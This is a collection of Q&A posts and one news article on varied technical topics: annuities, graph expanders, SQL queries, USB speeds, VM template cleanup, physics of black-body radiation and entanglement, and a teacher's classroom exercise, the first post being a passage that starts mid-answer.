  <li>$j_q=\left(1 +\frac{i^{(12)}}{12}\right)^{3}-1=3.03\%$ is the quarterly effective rate of interest</li>
  </ul>
</blockquote>

<p>Let be $P=100$ (for the first 2 years) and $Q=200$ (for the last 2 years) the payments made at the beginning of each period (each quarter) that will produce interest every month, or equivalently a first annuity of $P$ for 4 years and a second annuity of$P$ for 2 years.</p>

<p>The rate of interest is $1\%$ per month. In this annuity-due, there are 48 interest periods and each payment period consists of 3 interest coversion periods. So, the accumulated value is</p>

<blockquote>
  <p>$$
FV=100\frac{s_{\overline{48}|0.01}+s_{\overline{24}|0.01}}{a_{\overline{3}|0.01}}=100\frac{61.2226 + 26.9735}{2.9410}=2999
$$</p>
</blockquote>
",0
"<p>My question is about small set expansion properties of random unbalanced bipartite graphs. </p>

<p>Fix a positive <span class=""math-container"">$\delta&lt;1/2$</span>, and a positive integers <span class=""math-container"">$n,m,d$</span>. Let us call a bipartite graph <span class=""math-container"">$\mathcal{G}$</span> an <span class=""math-container"">$(n,m,d,\delta)$</span>-expander if the graph has <span class=""math-container"">$n$</span> left vertices, <span class=""math-container"">$m$</span> right vertices, every left vertex has degree <span class=""math-container"">$d$</span>, and for every subset <span class=""math-container"">$S$</span> of left vertices having size at most <span class=""math-container"">$\delta n$</span>, we have <span class=""math-container"">$|\mathcal{N}(S)|&gt;0.75 d|S|$</span>. Here <span class=""math-container"">$\mathcal{N}(S)$</span> denotes the set of neighbours of <span class=""math-container"">$S$</span>.</p>

<p>Consider a random <span class=""math-container"">$d$</span>-left regular graph, where the neighbourhood of each left vertex <span class=""math-container"">$i$</span> is a random subset <span class=""math-container"">$V_i$</span> of <span class=""math-container"">$d$</span> vertices on the right, and the <span class=""math-container"">$V_i$</span>'s are chosen independently of each other. For small <span class=""math-container"">$\delta$</span> independent of <span class=""math-container"">$n$</span>, and <span class=""math-container"">$d=O(\log(1/\delta))$</span> and <span class=""math-container"">$m=O(n\delta\log (1/\delta))$</span>, a random <span class=""math-container"">$d$</span>-left regular graph is an <span class=""math-container"">$(n,m,d,\delta)$</span>-expander with high probability for sufficiently large <span class=""math-container"">$n$</span>. We can prove this by computing <span class=""math-container"">$Pr[\mathcal{N}(S)\subset T]$</span> for <span class=""math-container"">$S,T$</span> with <span class=""math-container"">$|T|=0.75 d|S|-1$</span> and then taking a union bound over possible <span class=""math-container"">$S,T$</span> pairs.</p>

<p>If we force <span class=""math-container"">$d$</span> to be a constant independent of <span class=""math-container"">$n$</span>, and <span class=""math-container"">$m$</span> to grow linearly with <span class=""math-container"">$n$</span> while having <span class=""math-container"">$m&lt;n$</span>, what are the best parameters we can hope for (in the sense of having small <span class=""math-container"">$d$</span> and <span class=""math-container"">$m$</span>)? Is the above existence result order-optimal? If we are also interested in obtaining the best constants (and not just order optimality), what is known?</p>

<p>Also, is there a different proof/proof technique of existence of <span class=""math-container"">$(n,O(n\delta\log(1/\delta)), O(\log(1/\delta)),\delta)$</span> expanders? I tried to compute the expected size of the neighbourhood of <span class=""math-container"">$S$</span> and concentrate it using Chernoff-type bounds, but the parameters so obtained are worse.</p>
",0
"<p>Bad edits aren't limited to suggested edits. We tend not to notice the bad non-suggested edits because they don't get a minimum of two reviewers involved (three on SO).</p>

<p>One thing that we're very bad at is teaching what is a good edit and what is a bad edit. I've reviewed a lot of suggested edits in my time. I'm not in people's mind, of course, but I believe that in a majority of cases, the editors thought they were doing a good thing. Not all the time — I've also seen clear badge hunters — but often the editors gave me the impression that they were attempting to improve the site.</p>

<p>Even when I'd managed to reject a suggested edit in time and left some specific feedback such as “Please do not use code markup for proper names, only for code” or “Wikipedia content must be attributed and does not make an appropriate tag wiki in 99% of the cases”, it seemed a bit pointless. The editor is, practically speaking, never going to see that feedback.</p>

<p>An absolutely necessary change to improve the quality of edits is to <strong><a href=""https://meta.stackexchange.com/questions/120624/decision-on-rejected-edits-should-be-displayed-as-a-notification-to-the-editor"">notify editors of the reasons for rejected edits</a></strong>.</p>

<p>A lot of these people would be willing to learn, but we aren't seriously trying to teach them!</p>

<p>When bad editors become reviewers, they'll keep applying what they're used to, so the system tends to perpetuate itself. Merely teaching editors would start a virtuous circle which I would expect to drastically improve reviews as well, after a delay.</p>

<p>An argument in favor of this virtuous circle theory is that I've observed far more bad suggested edits on Stack Overflow than on other sites (tag wikis excluded).</p>

<p>If this isn't enough — but let's first do it and see the results after 6­–8 weeks — then we should teach reviewers as well — and editors with the editing privilege, for that matter. This could take the form of improved audits for suggested edits. Right now, we throw garbage as people and make sure they're rejecting it as such, which catches robo-reviewers, but not incompetent but well-meaning reviewers. We should have audits that reflect the actual typical kinds of good and bad edits that the sites see. (I'm sure this has been raised before on MSO.)</p>

<p>Discussions on MSO show that many people who review edits have never read the <a href=""https://stackoverflow.com/help/editing"">editing guidelines</a>, or didn't really pay attention to them. Since suggested edit review doesn't lack manpower, we could make becoming a reviewer more difficult, requiring passing several audits (drawn from real-life cases) <a href=""https://meta.stackexchange.com/questions/214541/give-new-edit-reviewers-some-audits-to-begin-with"">before getting access to real posts</a>. This could be done on Stack Overflow as a stopgap measure while attempting to shift the balance after starting to educate suggesting editors, in order to ensure that the feedback that editors get is correct.</p>
",0
"<p>All manuals focus on terminal commands. The use of the terminal is not the problem. But the return is incomprehensible. For example: </p>

<pre><code>lsusb -t
/:  Bus 06.Port 1: Dev 1, Class=root_hub,     Driver=xhci_hcd/2p, 5000M
    |__ Port 2: Dev 3, If 0, Class=Mass Storage, Driver=usb-storage, 5000M
/:  Bus 05.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/2p, 480M
|__ Port 1: Dev 2, If 0, Class=Hub, Driver=hub/4p, 480M
/:  Bus 04.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/4p, 5000M
    |__ Port 2: Dev 2, If 0, Class=Hub, Driver=hub/4p, 5000M
        |__ Port 1: Dev 3, If 0, Class=Hub, Driver=hub/4p, 5000M
/:  Bus 03.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/4p, 480M
    |__ Port 2: Dev 2, If 0, Class=Hub, Driver=hub/4p, 480M
        |__ Port 1: Dev 4, If 0, Class=Hub, Driver=hub/4p, 480M
/:  Bus 02.Port 1: Dev 1, Class=root_hub, Driver=ehci-pci/2p, 480M
    |__ Port 1: Dev 2, If 0, Class=Hub, Driver=hub/8p, 480M
    |__ Port 5: Dev 3, If 0, Class=Video, Driver=uvcvideo, 480M
    |__ Port 5: Dev 3, If 1, Class=Video, Driver=uvcvideo, 480M
    |__ Port 5: Dev 3, If 2, Class=Audio, Driver=snd-usb-audio, 480M
    |__ Port 5: Dev 3, If 3, Class=Audio, Driver=snd-usb-audio, 480M
    |__ Port 6: Dev 4, If 0, Class=Wireless, Driver=btusb, 12M
    |__ Port 6: Dev 4, If 1, Class=Wireless, Driver=btusb, 12M
/:  Bus 01.Port 1: Dev 1, Class=root_hub, Driver=ehci-pci/2p, 480M
|__ Port 1: Dev 2, If 0, Class=Hub, Driver=hub/6p, 480M
    |__ Port 2: Dev 3, If 0, Class=Mass Storage, Driver=usb-storage, 480M
    |__ Port 3: Dev 4, If 0, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 3: Dev 4, If 1, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 3: Dev 4, If 2, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 4: Dev 5, If 0, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 4: Dev 5, If 1, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 4: Dev 5, If 2, Class=Human Interface Device, Driver=usbhid, 12M
</code></pre>

<p>Or:</p>

<pre><code>lsblk
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
sda      8:0    0   2,7T  0 disk 
├─sda1   8:1    0     8G  0 part [SWAP]
└─sda2   8:2    0   2,7T  0 part /home
sdb      8:16   0 232,9G  0 disk 
├─sdb1   8:17   0   512M  0 part /boot/efi
├─sdb2   8:18   0 224,5G  0 part /
└─sdb3   8:19   0     8G  0 part [SWAP]
sdg      8:96   1  28,9G  0 disk 
├─sdg1   8:97   1   1,4G  0 part /media/ernst/Ubuntu 18.04 LTS amd64
└─sdg2   8:98   1   2,3M  0 part 
</code></pre>

<p>I know ""/media/ernst/Ubuntu 18.04 LTS amd64"" is using a USB-stick using a blue USB3-switch connected to USB3-cable connected to PC blue USB3 port. But how can I make sure these 4 hardwares are really using USB3 speed. </p>

<blockquote>
  <p>USB3-port ► USB3-cable ► USB3-switch ► USB-stick</p>
</blockquote>

<p>I bought the cable from a Chinese website, It's cheap so I do not really trust these stuff. I think that information like 12M, 480M and 5000M. Is that the speed per second?</p>

<p>If it's not really USB3, I can alway send it back to China. lol</p>
",0
"<p>What is the best way to get count for all the records, where case evaluates to one for all the conditions. I have the query as:</p>

<pre><code>SELECT  
    uuid , 
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Age_Group' and level2 = '18-24' ) THEN 1 END) AS 'Profile &gt; Age &gt; 18-24',
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Age_Group' and level2 = '25-34' ) THEN 1 END) AS 'Profile &gt; Age &gt; 25-34',
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Gender' and level2 = 'M' ) THEN 1 END) AS 'Profile &gt; Gender &gt; M',
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'State' and level2 = 'QLD' ) THEN 1 END) AS 'Profile &gt; State &gt; QLD',
    COUNT( CASE WHEN (dt = 2 and level0 = 'Insurance'  and level1 = 'Health' ) THEN 1 END) AS 'Interest &gt; Insurance &gt; Health',
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Kids' ) THEN 1 END) AS 'Profile &gt; Kids'
FROM segmentdata sd
WHERE sd.created &gt;= DATE_SUB(NOW(), INTERVAL 365 DAY)
GROUP BY sd.uuid;
</code></pre>

<p>The above query gives me a 1 and 0. I need to get a list of all one, for all the conditions and count them.</p>

<p>I have tried:</p>

<pre><code>SELECT 
    COUNT(CASE WHEN ((asd.`Profile &gt; Age &gt; 18-24` OR asd.`Profile &gt; Age &gt; 25-34`) 
        AND (asd.`Profile &gt; Gender &gt; M` AND asd.`Profile &gt; State &gt; QLD` 
        AND asd.`Interest &gt; Insurance &gt; Health`)
        AND NOT (asd.`Profile &gt; Kids`)) THEN 1 END )
FROM (
    SELECT
        uuid , 
            COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Age_Group'  and level2 = '18-24' )  THEN 1 END) AS 'Profile &gt; Age &gt; 18-24',
            COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Age_Group'  and level2 = '25-34' ) THEN 1 END) AS 'Profile &gt; Age &gt; 25-34',
            COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Gender'  and level2 = 'M' ) THEN 1 END) AS 'Profile &gt; Gender &gt; M',
            COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'State'  and level2 = 'QLD' ) THEN 1 END) AS 'Profile &gt; State &gt; QLD',
            COUNT(CASE WHEN (dt = 2 and level0 = 'Insurance'  and level1 = 'Health' ) THEN 1 END) AS 'Interest &gt; Insurance &gt; Health',
            COUNT(CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Kids' ) THEN 1 END) AS 'Profile &gt; Kids'
         FROM segmentdata sd
         WHERE sd.created &gt;= DATE_SUB(NOW(), INTERVAL 365 DAY)
         GROUP BY sd.uuid
     ) asd
</code></pre>

<p>But the above query takes a lot of time! What is the best way to do this? The above query takes about 1 -2 minutes. I need to reduce that time drastically. Please help. This is quite urgent. </p>

<p>My desired results are that the query runs as quickly as possible as well as gives me a count. For eg the above should give me the count from the table 'segmentdata'  for All 18-34 males in QLD interested in Health insurance, without kids.</p>

<p>Thanks</p>
",0
"<p>A general policy is to let the reporting layer handle things like only printing ParentIncome once.  However, since you are delivering a spreadsheet that will be used by others in who knows what manner, then I suppose you are stuck.</p>

<p>Because of the knowledge required you will need to develop some extra information (MIN, MAX, first, last, etc.) that is not known by a single row.  There are dodges different from ROW_NUMBER() OVER (PARTITION...), but there will still be an extra step.  </p>

<p>See the following:</p>

<pre><code>CREATE TABLE #parent
(ParentNum INT,
 ParentName VARCHAR(20),
 ParentIncome INT);

CREATE TABLE #child
(ChildNum INT,
 ChildParentNum INT,
 ChildName VARCHAR(20),
 ChildAllowance INT);

INSERT INTO #parent VALUES(10,'John',50000);
INSERT INTO #parent VALUES(20,'Jane',55000);
INSERT INTO #parent VALUES(30,'Jackie',90000);

INSERT INTO #child VALUES(1,10,'Johnny',5)
INSERT INTO #child VALUES(2,20,'Jackie',10)
INSERT INTO #child VALUES(3,20,'Billy',5)
INSERT INTO #child VALUES(4,20,'Sally',5)
INSERT INTO #child VALUES(5,30,'Monique',0)

-- Basic approach you may be using
</code></pre>

<p>See this example <a href=""http://sqlfiddle.com/#!3/7888e/5"" rel=""nofollow"">SQL Fiddle #1</a></p>

<pre><code>SELECT pc.ParentName, pc.ParentNum,
    CASE WHEN pc.RowNum = 1 THEN CAST(pc.ParentIncome AS VARCHAR(10)) ELSE '' END as ParentIncome,
    pc.ChildName, pc.ChildNum, pc.ChildAllowance
FROM (SELECT p.ParentNum, p.ParentName, p.ParentIncome, 
         c.ChildNum, c.ChildParentNum, c.ChildName, c.ChildAllowance,
         ROW_NUMBER() OVER (PARTITION BY ParentNum ORDER BY ParentNum) AS RowNum
       FROM #parent p JOIN #child c ON p.ParentNum = c.ChildParentNum) AS pc
ORDER BY pc.ParentNum, pc.ChildNum 

    -- An alternative, but still using a subselect for one element
</code></pre>

<p>See this example: <a href=""http://sqlfiddle.com/#!3/7888e/6"" rel=""nofollow"">SQL Fiddle #2</a></p>

<pre><code>SELECT  p.ParentName, p.ParentNum, 
        CASE WHEN c.ChildNum = mc.MinChild THEN CAST (ParentIncome AS VARCHAR(10)) ELSE '' END AS ParentIncome,
        c.ChildName, c.ChildNum, c.ChildAllowance
       FROM #parent p 
          JOIN #child as c 
             ON p.ParentNum = c.ChildParentNum
          -- This subselect gives the MIN (or First) ChildNum per Parent
          JOIN (SELECT ChildParentNum, MIN(ChildNum) AS MinChild
                  FROM #child
                  GROUP BY ChildParentNum) AS mc 
             ON mc.ChildParentNum = c.ChildParentNum 
ORDER BY p.ParentNum, c.ChildNum 

drop table #parent
drop table #child
</code></pre>

<p>Notice that I cast the ParentIncome as a VARCHAR(10) so that the datatype would be of the same type as the empty income of ''.  I originally used a NULL instead of a blank, but that might give you EXCEL problems.</p>

<p>Is it worth doing things this way?  It is up to you, but it primarily depends on what you like best.  The ROW_NUMBER() is a more powerful operator than MIN() and gives you more options, but in this case it appears that a MIN() will work for you.</p>
",0
"<p>Suppose the uncertainty in a time measurement does not increase with the length of time being measured. (This is usually a good assumption in most modern experiments.) Let's also assume that in the <span class=""math-container"">$N$</span>-period single measurement, we know exactly how many periods we're measuring (which is a good assumption as long as your uncertainty is much smaller than the period). Let's compare the total uncertainty on the two techniques' final result.</p>

<hr>

<p>Suppose you make <span class=""math-container"">$N$</span> measurements of one period. Each measurement has an uncertainty <span class=""math-container"">$\sigma_t$</span>. To obtain the final result, you take the average of the <span class=""math-container"">$N$</span> measurements (the sum divided by <span class=""math-container"">$N$</span>). The uncertainty <span class=""math-container"">$\sigma_{t,sum}$</span> on the sum of <span class=""math-container"">$N$</span> quantities is the quadrature sum</p>

<p><span class=""math-container"">$$\sigma_{t,sum} = \sqrt{(\sigma_t)^2 + (\sigma_t)^2 + ... + (\sigma_t)^2}=\sqrt{N(\sigma_t)^2}=\sqrt{N}\sigma_t$$</span></p>

<p>Since the average is the sum divided by <span class=""math-container"">$N$</span> (which is exact), the uncertainty in the average is also the uncertainty in the sum divided by <span class=""math-container"">$N$</span>:</p>

<p><span class=""math-container"">$$\sigma_{t,avg} = \frac{\sigma_t}{\sqrt{N}}$$</span></p>

<hr>

<p>Now suppose you make a single measurement of <span class=""math-container"">$N$</span> periods. Because we assumed that the uncertainty in the time measurement does not increase with the length of time being measured, the uncertainty in this measurement is still at most <span class=""math-container"">$\sigma_t$</span>. For this measurement, we find the period by dividing by <span class=""math-container"">$N$</span>. Since <span class=""math-container"">$N$</span> is exact, the uncertainty in the period from this measurement is</p>

<p><span class=""math-container"">$$\sigma_{t,single}=\frac{\sigma_t}{N}$$</span></p>

<hr>

<p>So, assuming that our above assumptions hold, making a single measurement produces a more precise result, especially as <span class=""math-container"">$N$</span> grows large. However, if the above assumptions are broken, then this may not be true any longer. For example, if the uncertainty in the time measured grows with the length of time measured (for example, if you're reading from a screen that has a finite precision, and longer time intervals force it to be less precise in displaying the reading; alternatively, if your timing device's measurements begin to drift from accuracy over long measurements, which is common with, for example, wind-up clocks), then the single measurement might not be the most precise result. In addition, if your time uncertainty is too large compared to the period, then you might also introduce an uncertainty in the number of periods you measured, which will affect the comparison of techniques in a more complicated way.</p>
",0
"<p>I am trying to draft a very simple data model for a multi-tenant database.</p>

<p>So far I have only 3 tables:</p>

<ul>
<li><strong>company</strong>: pretty much my tenant</li>
<li><strong>account</strong>: is part of one company and zero or more groups</li>
<li><strong>account_group</strong>: same as account: one company and zero or more accounts</li>
</ul>

<p>Here is the SQL:</p>

<pre><code>CREATE TABLE company (
  name TEXT NOT NULL,

  PRIMARY KEY (name)
);

CREATE TABLE account (
  email_address TEXT NOT NULL,
  company_name TEXT NOT NULL,

  PRIMARY KEY (email_address),
  FOREIGN KEY (company_name) REFERENCES company (name)
);

CREATE TABLE account_group (
  name TEXT NOT NULL,
  company_name TEXT NOT NULL,

  PRIMARY KEY (name, company_name),
  FOREIGN KEY (company_name) REFERENCES company (name)
);

CREATE TABLE account_group_membership (
  account_group_name TEXT NOT NULL,
  account_group_company_name TEXT NOT NULL,
  account_email_address TEXT NOT NULL,

  PRIMARY KEY (account_group_name, account_group_company_name, account_email_address),
  FOREIGN KEY (account_group_name, account_group_company_name) REFERENCES account_group (name, company_name),
  FOREIGN KEY (account_email_address) REFERENCES account (email_address)
);
</code></pre>

<p>In this specific case, there is no constraint between the Account Company and Group Company.</p>

<p>After doing some search, I found <a href=""https://dba.stackexchange.com/questions/8025/constraint-many-to-many-table-between-two-child-tables"">this question</a> and tried to add the following to my <code>account_group_membership</code> table;</p>

<pre><code>CREATE TABLE account_group_membership (
  account_group_name TEXT NOT NULL,
  account_group_company_name TEXT NOT NULL,
  account_email_address TEXT NOT NULL,
  account_company_name TEXT NOT NULL,

  PRIMARY KEY (account_group_name, account_group_company_name, account_email_address),
  FOREIGN KEY (account_group_name, account_group_company_name) REFERENCES account_group (name, company_name),
  FOREIGN KEY (account_email_address, account_company_name) REFERENCES account (email_address, company_name),
  CONSTRAINT same_company CHECK (account_group_company_name == account_company_name)
);
</code></pre>

<p>Unfortunately this doesn't work since the <code>company_name</code> column of the <code>account</code> table is not unique.</p>

<p>I cannot:</p>

<ol>
<li>Make the column <code>company_name</code> unique since multiple accounts can be from the company.</li>
<li>Use <code>email_address</code> and <code>company_name</code> as primary key for an <code>account</code>. The <code>email_address</code> should be unique in the whole table. Also <code>account</code> will mostly be queried by <code>email_address</code> and from time to time by <code>company_name</code>.</li>
<li>See any other solution actually....</li>
</ol>

<p>So is there any simple way to do this (simple as in easy to understand and maintain) ? 
Alternatively, does having this problem, mean that there is something wrong going on in the design ?</p>
",0
"<p>I remember a problem I had to solve during a student programming contest in 2001. The problem was this one:</p>

<blockquote>
  <p>Given masses of 1, 7, 13, ... (I don't remember which masses, but there was a finite, determinate set of masses), design a function that determines whether a given weight can be weighed on a scale with this set of masses.</p>
</blockquote>

<p>I started with nested loops, but quickly hit a wall. Then I came to realize that I had to start with enumerating what can be done with the lighter masses before going on with the heavier ones. I could solve the problem with a lot of unnested loops.</p>

<p>Hadn't I been youthfully arrogant and self-sufficient at that time (and had I known about and practiced generating functions), I might have defined the problem with generating functions as such :</p>

<p>Define $f(x)$ as the OGF for the number of ways that a weight $n$ can be weighed given the set of masses.</p>

<p>What weight on the right pan can I weigh given a single mass of 1?</p>

<p>Three possibilities:</p>

<ul>
<li>If I put the mass on the left pan, I can weigh 1.</li>
<li>If I put the mass on the right pan, I can weigh -1.</li>
<li>If I don't use the mass, I can weigh 0.</li>
</ul>

<p>So there is one way to weigh $-1$, one way to weigh $0$, and one way to weigh $1$. The generating function for this mass is something like $x^{-1} + 1 + x$, which corresponds to:</p>

<p>$$
\frac{1 - x^3}{x(1-x)}
$$</p>

<p>The generating function for a single mass $m$ is $x^{-m} + 1 + x^m$, which is :</p>

<p>$$
\frac{1 - x^{3m}}{x^m(1-x^m)}
$$</p>

<p>Given a multiset $M$ of masses, $f$ is expressed as the product of the single mass generating functions:</p>

<p>$$
f(x) = \frac{\prod_{m \in M}(1 - x^{3m})}{x^{\sum_{m \in M}m}\prod_{m \in M}(1 - x^{m})}
$$</p>

<p>Now, given a package that can perform operations on polynomials, you just have to :</p>

<ul>
<li>Calculate both products.</li>
<li>Perform the division of these products, starting with the lowest degree. (which terminates)</li>
<li>Shift the polynomial (euclidian division by $x^k$, keeping the quotient and dumping the remainder)</li>
</ul>

<p>And you're done. Now your polynomial has the number of ways to weigh $w \ge 0$ at index $w$. The only input is the multiset of masses $M$.</p>

<p>I designed the algorithm using mathematically sound components. The main part of the algorithm, which is a polynomial division with lowest degree first, is linear and can be implemented by an off-the-shelf package. It may not be optimal, but it certainly performs better than what I did at the contest, and in a less error-prone way.</p>

<p>If you look closely at the division process, you quickly see that the remainder can be seen as the ""current hidden state"" at every state of the process, and the quotient as the result. The process terminates when the ""current hidden state"" reaches zero everywhere.</p>

<p>You can implement polynomials as arrays or, if they are really really sparse, as index-coefficient ordered lists, and this won't change the algorithm.</p>
",0
"<p>To understand the origin of <a href=""https://en.wikipedia.org/wiki/Black-body_radiation"" rel=""nofollow"">black body radiation</a>, which is what every material body with a temperature T has been measured to <a href=""https://en.wikipedia.org/wiki/Black-body_radiation#Planck.27s_law_of_black-body_radiation"" rel=""nofollow"">emit</a>, one has to go to quantum statistical mechanics.</p>

<p>Atoms and molecules, to start with, in any ensemble, interact with the electromagnetic radiation. At that level, the processes are quantum mechanical. In quantum mechanics the exchanges of, for example, gas molecules as they bounce off each other, are changes in energy levels of the electrons that compose them . The kinetic energy of one molecule raises the energy level of an electron in the molecule it hit, (by exchanging a <a href=""https://en.wikipedia.org/wiki/Virtual_particle"" rel=""nofollow"">virtual photon).</a> The now excited molecule releases the energy as a real photon in a random direction, the electron going back to the ground state. This photon has an arbitrary direction and there is a high probability it will escape the gas volume without interacting again, and be part of the black body radiation.</p>

<p>For fluids and solids, where the molecules are bonded and cannot freely move, there are the vibrational and rotational quantum mechanical degrees of freedom. The atoms and molecules still interact, transferring kinetic energy to electron pushing them to higher energy levels (by virtual photon exchanges), and electrons fall back to the quantum mechanical ground state and a real photon will be radiated, with a high probability of getting out of the material as black body radiation.</p>

<blockquote>
  <p>If an object has a temperature due to nonzero entropy, then it must radiate.</p>
</blockquote>

<p>The internal motions of particles in an ensemble have a kinetic energy which is what builds up the <a href=""http://hyperphysics.phy-astr.gsu.edu/hbase/kinetic/kintem.html"" rel=""nofollow"">thermodynamically defined temperature</a> observed macroscopically . So any ensemble of molecules with a non zero temperature has kinetic energy which will result in radiation as described above. </p>

<p>In the statistical mechanics <a href=""https://en.wikipedia.org/wiki/Entropy_%28statistical_thermodynamics%29"" rel=""nofollow"">definition of entropy</a> it is connected to the number of available microstates .   ""non zero entropy"" is a confusing way to define the existence of temperature, the syllogism is: if there is entropy, microstates exist, therefore kinetic energy, therefor temperature. A simpler concept  should be ""due to nonzero kinetic energies of the ensemble particles"". ( see <a href=""https://en.wikipedia.org/wiki/Entropy_%28statistical_thermodynamics%29#Counting_of_microstates"" rel=""nofollow"">this</a> about zero temperature and entropy)</p>

<blockquote>
  <p>Why must it radiate? </p>
</blockquote>

<p>Because of the inevitable interactions in  large statistical ensembles due to kinetic vibrational and rotational motions/energy.</p>
",0
"<p>I don't have access to our current cleanup script right now, but one of things we take into account is the appliance can maybe be deployed without running the proper customization steps. That means, for instance, the hostname on the original image might live on, and has to be reset before closing. We usually set ours to <code>localhost</code>.</p>

<p>With that in mind, these are extra steps you might need to take care of</p>

<ul>
<li>clean up <code>/etc/hosts</code>, <code>/etc/resolv.conf</code>, <code>/etc/sysconfig/network</code> of any customized values</li>
<li>in addition to removing the ifcfg files, don't forget to remove any route files (<code>/etc/sysconfig/network-scripts/route-eno*</code>), if you have them</li>
<li>rotate and clean up every single logfile, audit log and the wtmp file (don't remove the wtmp file, just <code>cat /dev/null &gt; /var/log/wtmp</code>), so they start up empty</li>
<li>clean up <code>/var/tmp</code> and <code>/tmp</code></li>
<li>clean up the vmware provisioning log, if you have it (iirc, <code>/var/log/vmware-imc/*</code>)</li>
<li>if you registered your template into something like RH Satellite, SpaceWalk, SuSE Manager or RHN itself, make sure to restore <code>/etc/sysconfig/rhn</code> or similar back to default values. From experience, <code>rm</code>'ing these is a bad idea. We usually just make a backup when first creating the image, and mv that back when closing it down. Same goes for <code>/etc/sysconfig/osad</code>, if your environment uses it.</li>
<li>remove any extra users that might've been created, and EVERY SINGLE password on the shadow file</li>
<li>make sure the initialization, first boot, post-deploy-customization scripts are actually set to run on first boot.</li>
</ul>

<p>Last, but not least, you can zero out every single filesystem plus the extra unused VG space, so you can better compress the image. We have a script that goes into every filesystem, dd's a bunch of zeroes until it fills up, then removes the file. Same for a VG with empty space, create an LV that fills 100%FREE, zero it out and remove it. After finishing these last steps (the last ones before powering down), you can use a trick depending on the kind of image you're creating:</p>

<ul>
<li>For VMWare, clone the image into a new VM, with the destination set as thin provisioning.. When doing this, all the contiguous zeros will be converted into nothing</li>
<li>For openstack/kvm images, you might want to convert them using qemu-img to qcow2 (if your provider supports it), and enable the compress flag: <code>qemu-img convert -f raw -O qcow2 -c source.raw destination.qcow2</code></li>
</ul>

<p>One thing we've taken from this process is, every time we run thru a new cycle of images, we learn of something new we could've added, usually only after it has shipped. This gets added to the next cycle, and so on.</p>

<p>EDIT: on the spirit of the ""every time we learn something new"", the following steps were added last time:</p>

<ul>
<li>yum history new</li>
<li>yum reinstall basesystem -y</li>
</ul>
",0
"When Kyle Schwartz started teaching third grade at Doull Elementary School in Denver, she wanted to get to know her students better. She asked them to finish the sentence “I wish my teacher knew. ” The responses were   for Ms. Schwartz. Some children were struggling with poverty (“I wish my teacher knew I don’t have pencils at home to do my homework”) an absent parent (“I wish my teacher knew that sometimes my reading log is not signed because my mom isn’t around a lot”) and a parent taken away (“I wish my teacher knew how much I miss my dad because he got deported to Mexico when I was 3 years old and I haven’t seen him in six years”). The lesson spurred Ms. Schwartz, now entering her fifth teaching year, to really understand what her students were facing outside the classroom to help them succeed at school. When she shared the lesson last year with others, it became a sensation, with the Twitter hashtag “#iwishmyteacherknew” going viral. Other teachers tried the exercise and had similar insights. Many sent her their students’ responses. In her recently published book, “I Wish My Teacher Knew: How One Question Can Change Everything For Our Kids,” Ms. Schwartz details how essential it is for teachers and families to be partners. “I really want families to know how intentional teachers are about creating a sense of community and creating relationships with kids,” Ms. Schwartz said. “Kids don’t learn when they don’t feel safe or valued. ” Melody Molinoff of Washington, D. C. who has two sons, ages 9 and 11, in the public school system, agreed. “Parents see the teacher as their partner in bringing up their child, and that’s a huge responsibility that we are putting on our teachers and our schools,” Ms. Molinoff said. “I always want my sons’ teachers to know what their challenges are, what they like, just more about them. ” Mary Clayman, a   teacher in the Washington public schools, said she has noticed the same thing from the other side of the desk. “I’ve taught over 500 kids so far in my career and parents in every grade want to know how their child is doing socially and emotionally, often times more so than whether they can multiply or divide quite yet,” Mrs. Clayman said. In her book, Ms. Schwartz writes about mistakes that might have been prevented if she had known her students better. She had a student named Chris who was obsessed with science. Ms. Schwartz thought she had done Chris a huge favor by securing a spot for him in a   summer camp. But she was unaware of the family’s financial struggles and it turned out that his parents could not afford to take time off from work to get Chris to camp. Ms. Schwartz said classrooms can become a supportive environment for students coping with grief. She suggests that schools have “grief and loss” inventories for students who have gone through a crisis, with input from families so that the child’s future teachers know what that student is dealing with. “As teachers, we know parents are the first and best teachers for their children and we want them to work with us,” she said.",0
"<p>In <em>all</em> these discussions about entanglement, all the measured observables of Alice always commute with those of Bob. Their degrees of freedom describe two factors ${\mathcal H}_A$ and ${\mathcal H}_B$ of the overall Hilbert space of possibilities which is the tensor product
$$ {\mathcal H} = {\mathcal H}_A\otimes {\mathcal H}_B $$
This factorization of the Hilbert space has to be the case by definition, otherwise the notion of the entanglement cannot be defined at all.</p>

<p>I think that you got confused by some forgotten indices. The observables may be the Pauli matrices but they still need a label that indicates whether it's Alice's or Bob's Pauli matrices. So we have three matrices $\sigma_i^A$ belonging to Alice, and three $\sigma_i^B$ to Bob. In the whole Hilbert space, these six operators may be written as the tensor products
$$ \sigma_i \otimes 1, \quad 1 \otimes \sigma_i $$
The first three operators obey the usual Pauli matrix algebra among themselves, and so do the last three. But each of the first three commutes with each of the last three.</p>

<p>Also, I think that it's always extremely misleading to use the adjective ""non-local"" for entangled states just because they are entangled. There is nothing non-local about them. Only theories may be local or non-local, according to whether they allow superluminal influences. </p>

<p>Quantum field theory strictly bans any non-locality; non-relativistic quantum mechanical theories may allow them but these non-localities play absolutely no role in the explanation of the entanglement and the resulting correlations. Indeed, the locality of these theories is tightly linked to the fact that all Alice's observables commute with all Bob's observables. In quantum field theory, locality is mathematically expressed by the fact that the quantum fields exactly commute at spacelike separation:
$$ \forall x,y\in M^4,\,\,(x-y)^2\lt 0: \quad [\phi(x^\alpha), \phi (x^{\prime \beta})]=0 $$
